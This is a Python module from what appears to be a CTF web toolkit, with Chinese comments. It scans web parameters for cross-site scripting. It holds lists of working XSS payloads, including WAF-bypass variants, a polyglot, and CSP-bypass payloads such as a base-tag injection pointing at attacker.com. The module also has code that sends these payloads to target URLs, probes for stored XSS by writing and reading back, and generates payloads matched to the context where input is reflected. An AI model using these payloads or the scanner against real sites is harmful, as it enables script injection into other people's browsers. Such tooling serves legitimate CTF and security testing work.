"""
CTF Web Toolkit - XSS Detection Module
支持：反射型 / 存储型探测，Payload 变体生成，绕过 WAF
"""

import re
from typing import List, Optional
from core.requester import Requester
from core.utils import ok, info, warn, err, found, section

# ── 基础 XSS Payload ─────────────────────────
BASE_PAYLOADS = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "<body onload=alert(1)>",
    "'\"><script>alert(1)</script>",
    "<iframe src=javascript:alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<marquee onstart=alert(1)>",
    "<video><source onerror=alert(1)>",
]

# ── WAF 绕过变体 ──────────────────────────────
BYPASS_PAYLOADS = [
    # 大小写混淆
    "<ScRiPt>alert(1)</ScRiPt>",
    "<IMG SRC=x OnErRoR=alert(1)>",
    # 编码绕过
    "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
    "<img src=x onerror=\u0061\u006c\u0065\u0072\u0074(1)>",
    # 双重编码
    "%3Cscript%3Ealert(1)%3C/script%3E",
    "%253Cscript%253Ealert(1)%253C/script%253E",
    # 空白字符插入
    "<script >alert(1)</script>",
    "<scr\x00ipt>alert(1)</scr\x00ipt>",
    "<scr\nipt>alert(1)</scr\nipt>",
    # 注释插入
    "<scr<!---->ipt>alert(1)</scr<!---->ipt>",
    # JS 协议
    "javascript:alert(1)",
    "Java&#115;cript:alert(1)",
    "JaVaScRiPt:alert(1)",
    # DOM 类
    "#\"><img src=/ onerror=alert(1)>",
    # SVG 向量
    "<svg><script>alert&#40;1&#41;</script></svg>",
    "<svg><animate onbegin=alert(1) attributeName=x>",
    # 事件属性
    "<div onmouseover=alert(1)>hover me</div>",
    "<a href='javascript:void(0)' onclick=alert(1)>click</a>",
    # 模板注入混合
    "{{7*7}}<script>alert(1)</script>",
    # polyglot
    "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
]

# ── CSP 绕过 Payload ──────────────────────────
CSP_BYPASS_PAYLOADS = [
    # JSONP / callback 利用（需配合具体 endpoint）
    "<script src='//ajax.googleapis.com/ajax/libs/jquery/1.2.3/jquery.min.js'></script>",
    # base-uri 缺失
    "<base href='https://attacker.com'>",
    # object-src 缺失
    "<object data='javascript:alert(1)'>",
    # 利用允许的 CDN
    "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.0/angular.min.js'></script>"
    "<div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>",
]

# ── DOM XSS Source/Sink 特征 ──────────────────
DOM_SOURCES = [
    "location.hash", "location.search", "location.href",
    "document.referrer", "document.URL", "document.documentURI",
    "window.name",
]
DOM_SINKS = [
    "innerHTML", "outerHTML", "document.write", "document.writeln",
    "eval(", "setTimeout(", "setInterval(", "Function(",
    "location.assign", "location.replace", "location.href =",
    "src =", "action =",
]


class XSSScanner:
    def __init__(self, requester: Requester, reflect_marker: str = "XSS_PROBE_7x9k"):
        self.req = requester
        self.marker = reflect_marker

    def probe_reflection(self, url: str, param: str, method: str = "GET") -> dict:
        """探测参数是否被反射到响应中"""
        section(f"反射探测: {param}")
        resp = _send(self.req, url, param, self.marker, method)
        if not resp:
            return {"reflected": False}

        result = {"reflected": False, "context": "unknown", "filtered": []}
        body = resp.text

        if self.marker not in body:
            info(f"  标记未反射")
            return result

        result["reflected"] = True
        ok(f"  参数 {param!r} 存在反射")

        # 判断反射上下文
        idx = body.find(self.marker)
        snippet = body[max(0, idx - 80):idx + 80]
        if f"value=\"{self.marker}\"" in body or f"value='{self.marker}'" in body:
            result["context"] = "attribute_value"
        elif f">{self.marker}<" in body:
            result["context"] = "html_content"
        elif f"'{self.marker}'" in body or f'"{self.marker}"' in body:
            result["context"] = "js_string"
        elif self.marker in body:
            result["context"] = "html_content"
        info(f"  反射上下文: {result['context']}")
        info(f"  片段: {snippet!r}")

        # 检测过滤
        for char in ["<", ">", "\"", "'", "/"]:
            r = _send(self.req, url, param, self.marker + char, method)
            if r and char not in r.text[r.text.find(self.marker):r.text.find(self.marker) + 20]:
                result["filtered"].append(char)
        if result["filtered"]:
            warn(f"  过滤字符: {result['filtered']}")

        return result

    def scan_payloads(self, url: str, param: str,
                      payloads: Optional[List[str]] = None,
                      method: str = "GET", check_string: str = "alert(1)") -> List[str]:
        """发送一组 Payload，检测哪些被原样反射（可能触发 XSS）"""
        section(f"XSS Payload 扫描: {param}")
        if payloads is None:
            payloads = BASE_PAYLOADS + BYPASS_PAYLOADS
        success = []
        for p in payloads:
            resp = _send(self.req, url, param, p, method)
            if resp and check_string in resp.text:
                found("XSS Payload", p)
                success.append(p)
        if not success:
            info("未发现有效 XSS Payload")
        return success

    def check_stored(self, write_url: str, read_url: str,
                     write_param: str, write_method: str = "POST",
                     check_string: str = "alert(1)") -> bool:
        """检测存储型 XSS：先写入，再读取检测"""
        section("存储型 XSS 检测")
        for p in BASE_PAYLOADS[:5]:
            _send(self.req, write_url, write_param, p, write_method)
            resp = self.req.get(read_url)
            if resp and check_string in resp.text:
                found("存储型 XSS", p)
                return True
        info("未发现存储型 XSS")
        return False

    def analyze_csp(self, url: str) -> dict:
        """分析目标的 CSP 策略"""
        section("CSP 分析")
        resp = self.req.get(url)
        if not resp:
            return {}
        csp = resp.headers.get("Content-Security-Policy", "")
        if not csp:
            warn("无 CSP 策略（高危）")
            return {"exists": False}

        result = {"exists": True, "raw": csp, "issues": []}
        directives = {k.strip().split()[0]: k.strip() for k in csp.split(";")}

        # 检查危险配置
        if "'unsafe-inline'" in csp:
            result["issues"].append("存在 unsafe-inline（可直接执行内联脚本）")
        if "'unsafe-eval'" in csp:
            result["issues"].append("存在 unsafe-eval（可执行 eval）")
        if "script-src" not in csp and "default-src" not in csp:
            result["issues"].append("缺少 script-src 限制")
        if "object-src" not in csp:
            result["issues"].append("缺少 object-src 限制（可通过 <object> 绕过）")
        if "base-uri" not in csp:
            result["issues"].append("缺少 base-uri 限制（可注入 <base> 标签）")

        for issue in result["issues"]:
            warn(f"  CSP 问题: {issue}")
        if not result["issues"]:
            ok("  CSP 配置较完善")

        return result


# ── DOM XSS 静态分析 ──────────────────────────
def analyze_dom_xss(html_content: str) -> dict:
    """对 HTML/JS 内容进行 DOM XSS 静态分析"""
    section("DOM XSS 静态分析")
    result = {"sources": [], "sinks": []}
    for src in DOM_SOURCES:
        if src in html_content:
            result["sources"].append(src)
            found("DOM Source", src)
    for sink in DOM_SINKS:
        if sink in html_content:
            result["sinks"].append(sink)
            found("DOM Sink", sink)
    return result


# ── Payload 生成器 ────────────────────────────
def generate_payloads(context: str = "html", callback: str = "alert(1)") -> List[str]:
    """根据反射上下文生成针对性 Payload"""
    if context == "html_content":
        return [
            f"<script>{callback}</script>",
            f"<img src=x onerror={callback}>",
            f"<svg onload={callback}>",
        ]
    elif context == "attribute_value":
        return [
            f"\" onfocus={callback} autofocus x=\"",
            f"' onfocus={callback} autofocus x='",
            f"\" onmouseover={callback} x=\"",
        ]
    elif context == "js_string":
        return [
            f"';{callback};//",
            f"\";{callback};//",
            f"`);{callback};//",
        ]
    return BASE_PAYLOADS


# ── 内部辅助 ─────────────────────────────────
def _send(req: Requester, url: str, param: str, payload: str, method: str):
    try:
        if method.upper() == "GET":
            return req.get(url, params={param: payload})
        else:
            return req.post(url, data={param: payload})
    except Exception as e:
        err(f"请求失败: {e}")
        return None
